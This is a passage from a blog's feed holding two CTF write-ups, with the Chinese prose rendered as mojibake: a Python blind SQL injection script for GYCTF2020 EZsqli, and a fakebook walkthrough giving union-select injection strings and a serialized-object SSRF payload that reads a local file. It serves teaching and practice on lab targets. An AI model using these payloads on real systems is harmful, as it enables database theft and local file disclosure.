    <content type="html"><![CDATA[<p>å¸ƒå°”ç›²æ³¨+æ— åˆ—åæ³¨å…¥ï¼Œå±è”½äº†ç›¸å½“å¤šçš„å…³é”®å­—ğŸ˜“(or,if,and,informationâ€¦â€¦)</p><p>é¢˜ç›®åªç»™äº†ä¸€ä¸ªæ³¨å…¥ç‚¹ï¼Œburpçˆ†äº†ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°å¾ˆå¤šå…³é”®å­—éƒ½è¢«è¿‡æ»¤äº†</p><img src="/2021/11/17/GYCTF2020-EZsqli-Writeup/image-20211117201034083-16371516365892.png" alt="image-20211117201034083" style="zoom:50%;"><img src="/2021/11/17/GYCTF2020-EZsqli-Writeup/image-20211117201013528-16371516365881.png" alt="image-20211117201013528" style="zoom:50%;"><p>æ‰‹åŠ¨æ³¨<code>id=1</code>ï¼Œè¿”å›<code>Nu1L</code>,</p><p>æ³¨<code>id=2</code>è¿”å›<code>V&amp;N</code></p><p>æ³¨<code>id=1&amp;&amp;1=1</code>è¿”å›<code>Nu1L</code></p><p>æ³¨<code>id=1&amp;&amp;1=0</code>è¿”å›<code>Error Occured When Fetch Result.</code></p><p>æ³¨<code>id=2||1=0</code>è¿”å›<code>V&amp;N</code></p><p>æ¨æµ‹åº”è¯¥æ˜¯æ¡ä»¶ä¸ºçœŸæ—¶è¿”å›<code>Nu1L</code>,ä¸ºå‡æ—¶è¿”å›<code>V&amp;N</code>ï¼Œå¯ä»¥ç›²æ³¨ï¼Œä½†æ˜¯information_schemaè¢«è¿‡æ»¤ï¼Œæ— æ³•ä½¿ç”¨å¸¸è§„çš„æ–¹å¼ç›²æ³¨ï¼Œè¿™é‡Œå°±è¦ç”¨åˆ°æ— åˆ—åæ³¨å…¥</p><p>[]: <a href="https://blog.csdn.net/weixin_46330722/article/details/109605941">https://blog.csdn.net/weixin_46330722/article/details/109605941</a></p><p>åŒæ—¶MySQL5.7åæ–°å¢äº†sysåº“ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªåº“æ‰¾åˆ°è¡¨å</p><blockquote><p>sys.schema_table_statistics</p><p>sys.schema_table_statistics_with_buffer</p><p>sys.x$schema_flattened_keys</p></blockquote><p>ç›²æ³¨è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://531b7143-ac5d-43ab-babc-358f7d2439f0.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">table_name</span>():</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        l = <span class="number">32</span></span><br><span class="line">        r = <span class="number">128</span></span><br><span class="line">        mid = (l + r) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> (l &lt; r):</span><br><span class="line">            payload = <span class="string">&#x27;2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            params = &#123;<span class="string">&#x27;id&#x27;</span> : payload&#125;</span><br><span class="line">            re = requests.post(url, params)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">                l = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                r = mid</span><br><span class="line">            mid = (l + r) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid &lt;= <span class="number">33</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        result += <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            tmp = result + <span class="built_in">chr</span>(j)</span><br><span class="line">            payload = <span class="string">&quot;2||((select 1,&#x27;&#123;&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;</span>.<span class="built_in">format</span>(tmp)</span><br><span class="line">            params = &#123;<span class="string">&#x27;id&#x27;</span> : payload&#125;</span><br><span class="line">            re = requests.post(url, params)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">                result += <span class="built_in">chr</span>(j - <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#table_name()</span></span><br><span class="line">flag()</span><br></pre></td></tr></table></figure><p>çˆ†å‡ºflagåè½¬å°å†™å³å¯ï¼Œæœ€ç»ˆç»“æœ<code>flag&#123;3a86f50d-a6ae-470a-98b1-b2cfeef111bf&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¸ƒå°”ç›²æ³¨+æ— åˆ—åæ³¨å…¥ï¼Œå±è”½äº†ç›¸å½“å¤šçš„å…³é”®å­—ğŸ˜“(or,if,and,informationâ€¦â€¦)&lt;/p&gt;
&lt;p&gt;é¢˜ç›®åªç»™äº†ä¸€ä¸ªæ³¨å…¥ç‚¹ï¼Œburpçˆ†äº†ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°å¾ˆå¤šå…³é”®å­—éƒ½è¢«è¿‡æ»¤äº†&lt;/p&gt;
&lt;img src=&quot;/2021/11/17/GYCTF2020-EZsqli-Wri</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>æ”»é˜²ä¸–ç•Œ fakebook Writeup</title>
    <link href="https://wuyusanhua2021.github.io/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/"/>
    <id>https://wuyusanhua2021.github.io/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/</id>
    <published>2021-11-08T08:13:59.000Z</published>
    <updated>2022-01-06T05:20:09.297Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    ä¸€é“ç»“åˆäº†SSRFï¼Œsqlæ³¨å…¥ï¼Œååºåˆ—åŒ–çš„é¢˜</p><p>â€‹    ä¸€ä¸ªç”¨æˆ·æ³¨å†Œç™»å½•ç•Œé¢ï¼Œå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·</p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211108163451936.png" alt="image-20211108163451936"></p><p>æ³¨å†Œå®Œå°±ç›´æ¥è‡ªåŠ¨ç™»é™†äº†ï¼Œè¿›å…¥ç”¨æˆ·ç•Œé¢åæ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œä¸Šè¾¹æœ‰ä¸ªæ³¨å…¥ç‚¹ä¸çŸ¥é“è¯¥æ€ä¹ˆåˆ©ç”¨ï¼Œf12çœ‹æºä»£ç ä¹Ÿæ²¡æœ‰é¢å¤–æç¤º</p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211108163632419.png" alt="image-20211108163632419"></p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211108163813471.png" alt="image-20211108163813471"></p><p>è¿™ä¸ªæ—¶å€™å°±é ç»éªŒè¯•äº†è¯•è®¿é—®<code>robots.txt</code>ï¼Œå‘ç°æœ‰ç”¨ï¼Œå¾—åˆ°ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶<code>user.php.bak</code>ï¼Œä¸‹è½½ä¸‹æ¥ä¿®æ”¹æ–‡ä»¶æ ¼å¼æŸ¥çœ‹æºç </p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211108164141566.png" alt="image-20211108164141566"></p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211108164213944.png" alt="image-20211108164213944"></p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211108164225137.png" alt="image-20211108164225137"></p><p>ä¸€ä¸ªå¤„ç†ç”¨æˆ·ä¿¡æ¯çš„ç±»ï¼Œçªç ´å£åœ¨get()å‡½æ•°ï¼Œå‡½æ•°å†…éƒ¨æ²¡æœ‰å¯¹$urlåšä»»ä½•çš„è¿‡æ»¤ï¼Œç»å…¸SSRFæ¼æ´</p><p>å›åˆ°ç”¨æˆ·ç•Œé¢ï¼Œå…ˆä¼ ä¸ªä¸‡èƒ½å¯†ç è¯•ä¸€è¯•ï¼ŒæŠ¥é”™äº†ï¼ŒåŒæ—¶ç»™å‡ºäº†æ–‡ä»¶ç›®å½•</p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211108192329117.png" alt="image-20211108192329117"></p><p>ç»§ç»­åˆ©ç”¨è¿™ä¸ªç‚¹æµ‹è¯•ä¸€ä¸‹,å½“<code>order by 5</code>æ—¶é¡µé¢è¿”å›æŠ¥é”™ä¿¡æ¯</p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211109191959948.png" alt="image-20211109191959948"></p><p>æ³¨å…¥è¯­å¥è¢«è¿‡æ»¤äº†ï¼Œæ‰¾äº†æ‰¾å‘ç°æ˜¯ç©ºæ ¼ç»™è¿‡æ»¤äº†ï¼ŒåŒæ—¶ä¹Ÿçœ‹åˆ°äº†å›æ˜¾ç‚¹ä¸ºusernameï¼Œå¼€æ³¨</p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211109192537823.png" alt="image-20211109192537823"></p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211109193046757.png" alt="image-20211109193046757"></p><p>çˆ†åº“åï¼š</p><p><code>?no=0++union++select++1,group_concat(schema_name),3,4++from++information_schema.schemata#</code></p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211109194428506.png" alt="image-20211109194428506"><p>çˆ†è¡¨åï¼š</p><p><code>?no=0++union++select++1,group_concat(table_name),3,4++from++information_schema.tables++where++table_schema=&#39;fakebook&#39;#</code></p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211109195749356.png" alt="image-20211109195749356"></p><p>çˆ†åˆ—åï¼š</p><p><code>?no=0++union++select++1,group_concat(column_name),3,4++from++information_schema.columns++where++table_name=&#39;users&#39;#</code></p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211109200802447.png" alt="image-20211109200802447"></p><p>å‰é¢çš„å‚æ•°éƒ½æ˜¯å·²çŸ¥çš„ï¼Œç›´æ¥çœ‹dataï¼š</p><p><code>?no=0++union++select++1,group_concat(data),3,4++from++users#</code></p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211109201002941.png" alt="image-20211109201002941"></p><p>å¾—åˆ°ä¸€æ®µåºåˆ—åŒ–åçš„æ•°æ®ï¼Œè”ç³»ä¸Šé¢çš„SSRFæ¼æ´ï¼Œå¤§æ¦‚æ˜¯è¦åˆ©ç”¨ååºåˆ—åŒ–æ¥æ„é€ ä¸€ä¸ªpayloadï¼Œä½¿fileä¼ªåè®®èƒ½å¤Ÿé¡ºåˆ©æ‰§è¡Œã€‚</p><p>æœ€åçš„payloadåº”è¯¥æ˜¯:<code>?no=0++union++select++1,2,3,%27O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;%27</code></p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211109210951723.png" alt="image-20211109210951723"></p><p>æ­¤æ—¶å†æŸ¥çœ‹æºç ï¼Œå¤šå‡ºä¸€æ®µbase64åŠ å¯†çš„å¯†æ–‡ï¼Œè§£å¯†å¾—åˆ°flag</p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211109211140021.png" alt="image-20211109211140021"></p><p><img src="/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-WP/image-20211109211346731.png" alt="image-20211109211346731"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    ä¸€é“ç»“åˆäº†SSRFï¼Œsqlæ³¨å…¥ï¼Œååºåˆ—åŒ–çš„é¢˜&lt;/p&gt;
&lt;p&gt;â€‹    ä¸€ä¸ªç”¨æˆ·æ³¨å†Œç™»å½•ç•Œé¢ï¼Œå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fakebook-W</summary>
      
    
    
    
    
  </entry>
  
</feed>
